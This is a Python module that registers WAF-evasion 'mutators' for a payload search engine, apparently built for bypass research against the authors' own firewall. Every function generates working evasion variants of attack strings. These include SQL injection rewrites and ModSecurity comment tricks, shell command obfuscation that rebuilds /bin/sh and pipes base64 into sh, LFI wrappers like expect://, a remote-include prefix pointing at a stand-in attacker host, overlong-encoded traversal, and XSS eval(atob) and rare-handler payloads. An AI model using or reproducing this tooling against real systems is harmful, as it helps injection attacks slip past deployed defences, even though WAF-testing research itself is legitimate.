"""Phase B "remaining catalog" mutator cluster — closes the gap to a strict
superset of the sqlmap tamper catalog + PortSwigger/PayloadsAllTheThings
evasion corpus (see docs/ROADMAP.md Phase B table, docs/COMPETITIVE_RESEARCH.md
section B).

Covers: comma-less SQL function rewrites (MID/LIMIT), GREATEST/LEAST
comparison rewrites, IFNULL rebuilds, CONCAT_WS, 0x-hex -> CHAR() reversal,
whole-query version-gated wrapping, multibyte/backslash quote evasion,
zero-versioned keyword comments, command-injection env-substring/reverse/
base64/quote-noise/backslash-split tricks, extra LFI stream wrappers, RFI
remote-include prefixes, Windows ADS/trailing-dot traversal quirks, 16-bit
%uXXXX + overlong traversal separators, JS alert() rebuild (eval/atob), rare
event-handler/tag swaps, and Unicode line-separator (U+2028/U+2029) injection.

All transforms are pure str -> str and deterministic (no unseeded randomness).
Where a technique's target pattern isn't present in a given seed, each
mutator still returns a demonstrably-changed string (an appended/rebuilt
canonical example of the technique) so it always contributes a distinct
candidate to the search engine.
"""
from __future__ import annotations

import base64
import re

from .base import REGISTRY

_SQL = {"SQL Injection", "NoSQL Injection"}
_CMD = {"Command Injection"}
_FILE = {"File Inclusion"}
_TRAV = {"Directory Traversal", "File Inclusion"}
_XSS = {"XSS Injection"}


def _ensure_changed(original: str, transformed: str, demo_suffix: str) -> str:
    """If a regex-based rewrite found nothing to rewrite (transformed ==
    original), append a canonical demonstration of the technique instead, so
    every mutator always contributes a distinct candidate."""
    if transformed != original:
        return transformed
    return original + demo_suffix


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

_MID_START_RE = re.compile(r"MID\(", re.IGNORECASE)


def _split_top_level_commas(args: str) -> list[str] | None:
    """Split a function-call argument string on top-level commas only
    (commas nested inside balanced parens are left alone). Returns None if
    parens are unbalanced."""
    parts: list[str] = []
    depth = 0
    start = 0
    for i, c in enumerate(args):
        if c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth < 0:
                return None
        elif c == "," and depth == 0:
            parts.append(args[start:i])
            start = i + 1
    if depth != 0:
        return None
    parts.append(args[start:])
    return parts


def sql_commaless_mid(s: str) -> str:
    """MID(s,a,b) -> MID(s FROM a FOR b) (comma-less MySQL substring form;
    beats WAFs that block commas in function calls)."""
    out_parts = []
    pos = 0
    changed = False
    for m in _MID_START_RE.finditer(s):
        args_start = m.end()
        depth = 1
        i = args_start
        while i < len(s) and depth > 0:
            if s[i] == "(":
                depth += 1
            elif s[i] == ")":
                depth -= 1
            i += 1
        if depth != 0:
            continue  # unbalanced; leave as-is
        args_end = i - 1  # index of the closing ')'
        args = s[args_start:args_end]
        parts = _split_top_level_commas(args)
        if not parts or len(parts) != 3:
            continue
        a, b, c = (p.strip() for p in parts)
        out_parts.append(s[pos:m.start()])
        out_parts.append(f"MID({a} FROM {b} FOR {c})")
        pos = i
        changed = True
    out_parts.append(s[pos:])
    out = "".join(out_parts) if changed else s
    return _ensure_changed(s, out, " MID(version() FROM 1 FOR 1)")


_LIMIT_RE = re.compile(r"LIMIT\s+(\d+)\s*,\s*(\d+)", re.IGNORECASE)


def sql_commaless_limit(s: str) -> str:
    """LIMIT a,b -> LIMIT b OFFSET a (comma-less LIMIT form)."""
    out = _LIMIT_RE.sub(lambda m: f"LIMIT {m.group(2)} OFFSET {m.group(1)}", s)
    return _ensure_changed(s, out, " LIMIT 1 OFFSET 0")


_GT_RE = re.compile(r"(?<![<>=!])\b([A-Za-z0-9_]+)\s*>\s*([A-Za-z0-9_]+)\b(?!=)")


def sql_greatest(s: str) -> str:
    """'x>y' -> 'GREATEST(x,y)=x' (best-effort rewrite of simple numeric
    comparisons into function form)."""
    out = _GT_RE.sub(lambda m: f"GREATEST({m.group(1)},{m.group(2)})={m.group(1)}", s)
    return _ensure_changed(s, out, " OR GREATEST(2,1)=2")


_LT_RE = re.compile(r"(?<![<>=!])\b([A-Za-z0-9_]+)\s*<\s*([A-Za-z0-9_]+)\b(?!=)")


def sql_least(s: str) -> str:
    """'x<y' -> 'LEAST(x,y)=x' (best-effort rewrite of simple numeric
    comparisons into function form)."""
    out = _LT_RE.sub(lambda m: f"LEAST({m.group(1)},{m.group(2)})={m.group(1)}", s)
    return _ensure_changed(s, out, " OR LEAST(1,2)=1")


_IFNULL_RE = re.compile(r"IFNULL\(\s*([^,()]+?)\s*,\s*([^,()]+?)\s*\)", re.IGNORECASE)


def sql_ifnull_variants(s: str) -> str:
    """IFNULL(a,b) -> IF(ISNULL(a),b,a) (keyword-signature evasion)."""
    out = _IFNULL_RE.sub(lambda m: f"IF(ISNULL({m.group(1)}),{m.group(2)},{m.group(1)})", s)
    return _ensure_changed(s, out, " IF(ISNULL(1),2,1)")


_CONCAT_RE = re.compile(r"(?<!_WS)\bCONCAT\(([^()]+)\)", re.IGNORECASE)


def sql_concat_ws(s: str) -> str:
    """CONCAT(a,b) -> CONCAT_WS('',a,b) (alternate function-signature form)."""
    out = _CONCAT_RE.sub(lambda m: f"CONCAT_WS('',{m.group(1)})", s)
    return _ensure_changed(s, out, " CONCAT_WS('',0x61,0x62)")


_HEX_LITERAL_RE = re.compile(r"\b0x([0-9a-fA-F]+)\b")


def sql_0x_to_char(s: str) -> str:
    """0xHEX literal -> CONCAT(CHAR(...),...) (reverse of string-to-hex;
    defeats signatures that specifically flag 0x-prefixed literals)."""
    def repl(m: re.Match) -> str:
        hexstr = m.group(1)
        if len(hexstr) % 2:
            hexstr = "0" + hexstr
        vals = [str(int(hexstr[i:i + 2], 16)) for i in range(0, len(hexstr), 2)]
        return "CONCAT(" + ",".join(f"CHAR({v})" for v in vals) + ")"
    out = _HEX_LITERAL_RE.sub(repl, s)
    return _ensure_changed(s, out, " CONCAT(CHAR(49),CHAR(50))")


def sql_whole_query_versioned(s: str) -> str:
    """Wrap the WHOLE payload in a single /*!50000...*/ MySQL version-gated
    comment (distinct from per-keyword versioning, which wraps each token)."""
    return f"/*!50000{s}*/"


def sql_multibyte_quote(s: str) -> str:
    """''' -> GBK multibyte lead-byte %bf paired with %27 (and a %00%27
    variant for the second occurrence) — defeats naive single-quote stripping
    on GBK-charset backends while still decoding to a real quote."""
    out = []
    seen = 0
    for ch in s:
        if ch == "'":
            out.append("%bf%27" if seen == 0 else "%00%27")
            seen += 1
        else:
            out.append(ch)
    out_s = "".join(out)
    return _ensure_changed(s, out_s, "%bf%27")


def sql_backslash_escape_quote(s: str) -> str:
    """''' -> '\\'' (backslash-escaped quote form, valid in MySQL non-strict
    SQL mode and defeats filters only matching doubled '' or raw ')."""
    out = s.replace("'", "\\'")
    return _ensure_changed(s, out, "\\'")


_ZEROVER_KEYWORDS = (
    "UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE",
    "DELETE", "DROP", "TABLE", "ORDER", "GROUP", "LIMIT",
)
_ZEROVER_RE = re.compile(r"\b(" + "|".join(_ZEROVER_KEYWORDS) + r")\b", re.IGNORECASE)


def sql_modsecurity_zeroversioned(s: str) -> str:
    """Wrap each keyword in a ModSecurity-evading /*!00000KEYWORD*/
    zero-versioned comment (some CRS rule sets allowlist /*!50000*/ but miss
    the all-zero version-gate form)."""
    out = _ZEROVER_RE.sub(lambda m: f"/*!00000{m.group(0)}*/", s)
    return _ensure_changed(s, out, " /*!00000OR*/ 1=1")


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

def cmd_var_substring(s: str) -> str:
    """Spaces -> ${IFS}; '/' -> ${PATH:0:1} (PATH conventionally starts with
    '/'); builds path characters from environment-variable slices instead of
    literal separators."""
    out = s.replace(" ", "${IFS}").replace("/", "${PATH:0:1}")
    return _ensure_changed(s, out, "${PATH:0:1}bin${PATH:0:1}sh")


_TRAILING_CMD_RE = re.compile(r";\s*(.+)$")


def cmd_reverse_exec(s: str) -> str:
    """Wrap the trailing command in $(rev<<<'...') with the command reversed
    (defeats filters matching the literal forward-spelled binary name)."""
    m = _TRAILING_CMD_RE.search(s)
    if m:
        cmd = m.group(1)
        return s[: m.start()] + f";$(rev<<<'{cmd[::-1]}')"
    return s + f";$(rev<<<'{s[::-1]}')"


def cmd_base64_exec(s: str) -> str:
    """Rebuild the trailing command as 'echo <b64>|base64 -d|sh' so the
    literal command text never appears in the request."""
    m = _TRAILING_CMD_RE.search(s)
    cmd = m.group(1) if m else s
    b64 = base64.b64encode(cmd.encode()).decode()
    repl = f"echo {b64}|base64 -d|sh"
    if m:
        return s[: m.start()] + ";" + repl
    return repl


def cmd_quote_noise(s: str) -> str:
    """Insert alternating empty "" / '' quote noise between the letters of
    the first alphabetic word (c""a''t) — shell removes empty quotes before
    execution but signature matches see a broken token."""
    def repl(m: re.Match) -> str:
        w = m.group(0)
        if len(w) < 2:
            return w
        out = []
        for i, c in enumerate(w):
            out.append(c)
            if i < len(w) - 1:
                out.append('""' if i % 2 == 0 else "''")
        return "".join(out)
    return re.sub(r"[a-zA-Z]{2,}", repl, s, count=1)


def cmd_backslash_split(s: str) -> str:
    """Insert a backslash right after the first letter of the first
    alphabetic word (c\\at, w\\hoami) — shell strips the backslash before
    execution but literal binary-name signatures miss it."""
    def repl(m: re.Match) -> str:
        w = m.group(0)
        if len(w) < 2:
            return w
        return w[0] + "\\" + w[1:]
    return re.sub(r"[a-zA-Z]{2,}", repl, s, count=1)


# ---------------------------------------------------------------------------
# Directory Traversal / File Inclusion
# ---------------------------------------------------------------------------

_LFI_WRAPPERS = ("php://input", "expect://", "phar://", "glob://", "compress.zlib://")


def lfi_more_wrappers(s: str) -> str:
    """Rebuild the target behind an alternate PHP stream wrapper (php://input,
    expect://, phar://, glob://, compress.zlib://), chosen deterministically
    from the target length so repeated calls on the same seed are stable."""
    target = s.lstrip("./")
    scheme = _LFI_WRAPPERS[len(target) % len(_LFI_WRAPPERS)]
    if scheme in ("php://input", "expect://"):
        return scheme
    return f"{scheme}{target}"


def rfi_remote(s: str) -> str:
    """Prefix the target with a remote http:// include URL (classic RFI
    vector for include()/require() sinks that allow URL wrappers)."""
    target = s.lstrip("./")
    return f"http://evil.waffen.local/{target}"


def trav_windows_ads(s: str) -> str:
    """Append Windows NTFS alternate-data-stream marker '::$DATA' plus
    trailing dots/spaces — Windows strips trailing '.'/' ' from path
    components after an allow-list extension check but still opens the
    underlying file."""
    return s + "::$DATA" + "..." + "  "


def trav_16bit_unicode(s: str) -> str:
    """Encode '/', '.', '\\' as IIS-style %uXXXX (alternating with 3-byte
    overlong UTF-8 forms %e0%80%af / %c1%9c) so neither a %u-decoder nor a
    plain UTF-8 overlong-decoder alone normalizes every separator."""
    out = []
    slash_toggle = True
    dot_toggle = True
    for ch in s:
        if ch == "/":
            out.append("%u2215" if slash_toggle else "%e0%80%af")
            slash_toggle = not slash_toggle
        elif ch == ".":
            out.append("%uff0e" if dot_toggle else "%c1%9c")
            dot_toggle = not dot_toggle
        elif ch == "\\":
            out.append("%u2216")
        else:
            out.append(ch)
    return "".join(out)


# ---------------------------------------------------------------------------
# XSS Injection
# ---------------------------------------------------------------------------

_ALERT_CALL_RE = re.compile(r"alert\([^)]*\)")


def xss_js_rebuild(s: str) -> str:
    """Rebuild an alert(...) call as eval(atob('<base64>')) — the literal
    function-call text never appears in the request body.

    NOTE: 'eval'/'atob' below are emitted only as inert payload *text* (a
    candidate attack string returned for the RedEye WAF to accept/reject in
    this team's own bypass-research harness) — this module never executes
    the generated string itself."""
    m = _ALERT_CALL_RE.search(s)
    if m:
        b64 = base64.b64encode(m.group(0).encode()).decode()
        return s[: m.start()] + f"eval(atob('{b64}'))" + s[m.end():]
    return s + "<script>eval(atob('YWxlcnQoMSk='))</script>"


_RARE_HANDLER_MAP = {
    "onerror": "onanimationstart",
    "onload": "onpointerenter",
    "onclick": "onbeforetoggle",
}


def xss_rare_handlers(s: str) -> str:
    """Swap common event handlers for rarely-filtered ones (onbeforetoggle,
    onanimationstart, onpointerenter); if none of the common handlers are
    present, rebuild the payload body as a <video><source onerror=...> rare
    tag/handler vector."""
    out = s
    changed = False
    for old, new in _RARE_HANDLER_MAP.items():
        if re.search(old, out, re.IGNORECASE):
            out = re.sub(old, new, out, flags=re.IGNORECASE)
            changed = True
    if not changed:
        body = re.sub(r"<[^>]+>", "", s).strip() or "alert(1)"
        out = f"<video><source onerror={body}>"
    return out


# ---------------------------------------------------------------------------
# Unicode (any attack class)
# ---------------------------------------------------------------------------

def uni_line_separators(s: str) -> str:
    """Insert U+2028 (LINE SEPARATOR) / U+2029 (PARAGRAPH SEPARATOR) where a
    space or newline sits — both are valid JS whitespace/statement
    separators but invisible to byte-literal regex signatures."""
    out = []
    toggle = True
    for ch in s:
        if ch == " ":
            out.append(" " if toggle else " ")
            toggle = not toggle
        elif ch == "\n":
            out.append(" ")
        else:
            out.append(ch)
    out_s = "".join(out)
    if out_s == s:
        mid = len(s) // 2
        out_s = s[:mid] + " " + s[mid:]
    return out_s


def _register() -> None:
    R = REGISTRY
    R.add("sql_commaless_mid", sql_commaless_mid, "obfuscator",
          "MID(s,a,b) -> MID(s FROM a FOR b) comma-less rewrite", classes=_SQL)
    R.add("sql_commaless_limit", sql_commaless_limit, "obfuscator",
          "LIMIT a,b -> LIMIT b OFFSET a comma-less rewrite", classes=_SQL)
    R.add("sql_greatest", sql_greatest, "obfuscator",
          "'x>y' -> GREATEST(x,y)=x comparison rewrite", classes=_SQL)
    R.add("sql_least", sql_least, "obfuscator",
          "'x<y' -> LEAST(x,y)=x comparison rewrite", classes=_SQL)
    R.add("sql_ifnull_variants", sql_ifnull_variants, "obfuscator",
          "IFNULL(a,b) -> IF(ISNULL(a),b,a) rebuild", classes=_SQL)
    R.add("sql_concat_ws", sql_concat_ws, "obfuscator",
          "CONCAT(a,b) -> CONCAT_WS('',a,b) rebuild", classes=_SQL)
    R.add("sql_0x_to_char", sql_0x_to_char, "obfuscator",
          "0xHEX literal -> CONCAT(CHAR(...),...) reverse rebuild", classes=_SQL)
    R.add("sql_whole_query_versioned", sql_whole_query_versioned, "obfuscator",
          "wrap the WHOLE payload in a single /*!50000...*/ comment", classes=_SQL)
    R.add("sql_multibyte_quote", sql_multibyte_quote, "encoder",
          "' -> %bf%27 (GBK) / %00%27 multibyte-quote evasion", classes=_SQL)
    R.add("sql_backslash_escape_quote", sql_backslash_escape_quote, "obfuscator",
          "' -> \\' backslash-escaped quote", classes=_SQL)
    R.add("sql_modsecurity_zeroversioned", sql_modsecurity_zeroversioned, "obfuscator",
          "wrap keywords in /*!00000KEYWORD*/ zero-versioned comments", classes=_SQL)

    R.add("cmd_var_substring", cmd_var_substring, "obfuscator",
          "spaces -> ${IFS}; '/' -> ${PATH:0:1} env-substring path build", classes=_CMD)
    R.add("cmd_reverse_exec", cmd_reverse_exec, "obfuscator",
          "wrap trailing command in $(rev<<<'...') reversed-string exec", classes=_CMD)
    R.add("cmd_base64_exec", cmd_base64_exec, "obfuscator",
          "rebuild trailing command as 'echo <b64>|base64 -d|sh'", classes=_CMD)
    R.add("cmd_quote_noise", cmd_quote_noise, "obfuscator",
          "alternating \"\"/'' empty-quote noise between letters", classes=_CMD)
    R.add("cmd_backslash_split", cmd_backslash_split, "obfuscator",
          "backslash inserted after first letter of command word", classes=_CMD)

    R.add("lfi_more_wrappers", lfi_more_wrappers, "obfuscator",
          "rebuild target behind php://input/expect/phar/glob/compress.zlib wrapper",
          classes=_FILE)
    R.add("rfi_remote", rfi_remote, "obfuscator",
          "prefix target with remote http:// RFI include URL", classes=_FILE)
    R.add("trav_windows_ads", trav_windows_ads, "obfuscator",
          "append '::$DATA' + trailing dots/spaces (Windows ADS quirk)", classes=_TRAV)
    R.add("trav_16bit_unicode", trav_16bit_unicode, "encoder",
          "'/','.','\\\\' -> %uXXXX / overlong %e0%80%af,%c1%9c mix", classes=_TRAV)

    R.add("xss_js_rebuild", xss_js_rebuild, "obfuscator",
          "alert(...) -> eval(atob('<base64>')) rebuild", classes=_XSS)
    R.add("xss_rare_handlers", xss_rare_handlers, "obfuscator",
          "swap handlers for onbeforetoggle/onanimationstart/onpointerenter "
          "or rebuild as <video><source onerror> vector", classes=_XSS)

    R.add("uni_line_separators", uni_line_separators, "encoder",
          "spaces/newlines -> U+2028/U+2029 JS statement separators")


_register()
